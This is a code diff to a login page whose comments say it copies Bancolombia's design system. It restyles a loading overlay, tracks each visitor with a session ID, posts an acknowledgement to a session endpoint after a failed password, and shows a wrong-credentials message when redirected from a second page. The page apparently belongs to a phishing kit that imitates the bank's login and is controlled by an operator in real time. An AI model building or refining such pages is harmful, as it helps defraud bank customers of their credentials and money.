@@ -70,23 +70,43 @@
       cursor: not-allowed;
       pointer-events: none;
     }
+
+    /* Modal Spinner Overlay matching Bancolombia BDS */
     #personas-loader {
       position: fixed;
       inset: 0;
-      background: rgba(255, 255, 255, 0.9);
+      background: rgba(0, 0, 0, 0.45);
+      backdrop-filter: blur(2px);
       z-index: 99999;
       display: none;
-      flex-direction: column;
       align-items: center;
       justify-content: center;
     }
-    .spinner-ring {
-      width: 48px;
-      height: 48px;
-      border: 5px solid #f3f3f3;
-      border-top: 5px solid #fd0;
+    .loader-circle-card {
+      width: 150px;
+      height: 150px;
+      background: #ffffff;
       border-radius: 50%;
-      animation: spin 1s linear infinite;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.2);
+    }
+    .spinner-ring {
+      width: 42px;
+      height: 42px;
+      border: 3.5px solid #eaeaea;
+      border-top: 3.5px solid #2c2a29;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+    .loader-text {
+      font-weight: 600;
+      margin-top: 10px;
+      font-size: 0.85rem;
+      color: #2c2a29;
+      letter-spacing: -0.2px;
     }
     @keyframes spin {
       0% { transform: rotate(0deg); }
@@ -175,11 +195,15 @@
   </footer>
 
   <div id="personas-loader">
-    <div class="spinner-ring"></div>
-    <p style="font-weight: 600; margin-top: 18px; font-size: 1rem; color: #2c2a29;">Cargando...</p>
+    <div class="loader-circle-card">
+      <div class="spinner-ring"></div>
+      <p class="loader-text">Cargando...</p>
+    </div>
   </div>
 
   <script>
+    sessionStorage.setItem('loginOrigin', 'personas.html');
+
     // 1. Session Setup
     let sessionId = sessionStorage.getItem('sessionId') || ('sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9));
     sessionStorage.setItem('sessionId', sessionId);
@@ -225,6 +249,7 @@
               errorEl.hidden = false;
               inputClave.value = '';
               verificarFormulario();
+              fetch(`/api/sessions/${sessionId}/ack`, { method: 'POST' }).catch(() => {});
             }
           }
         } catch (_) {}
@@ -335,6 +360,18 @@
         errorEl.textContent = "Error al intentar conectar. Intente de nuevo.";
         errorEl.hidden = false;
       });
+    });
+
+    // Check if redirected from clave.html with error
+    window.addEventListener('DOMContentLoaded', () => {
+      const urlParams = new URLSearchParams(window.location.search);
+      if (urlParams.get('error') === 'error-login') {
+        const errorEl = document.getElementById("error-msg");
+        if (errorEl) {
+          errorEl.textContent = "Usuario o clave incorrecta. Por favor, verifica tus datos.";
+          errorEl.hidden = false;
+        }
+      }
     });
 
     // 4. Footer Date/Time and IP
